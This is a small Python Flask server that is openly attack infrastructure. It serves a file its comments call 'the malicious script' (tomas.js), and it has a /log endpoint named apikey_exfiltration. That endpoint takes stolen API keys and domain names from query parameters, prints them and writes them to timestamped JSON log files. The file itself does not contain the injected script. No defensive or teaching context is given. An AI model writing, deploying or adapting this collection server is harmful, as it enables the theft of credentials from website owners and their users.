from flask import Flask, send_from_directory, request
from datetime import datetime
import os
import json

app = Flask(__name__)

# route for serving the malicious script
@app.route("/tomas.js")
def serve_script():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'tomas.js')

# route for receiving the key and saving to a json file
@app.route("/log")
def apikey_exfiltration():
    # take the args from request
    key = request.args.get('key', 'NO_KEY')
    domain = request.args.get('domain', 'NO_DOMAIN')

    print("[RECEIVED KEY] Domain: ", domain, " | Key: ", key)

    # save to a new json file in logs dir
    time = datetime.now().strftime('%Y%m%d_%H%M%S')

    data = {
        "timestamp": time,
        "domain": domain,
        "key": key
    }

    file_name = "log_" + time + ".json"
    file_path = os.path.join('logs', file_name)

    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)

    return "OK"

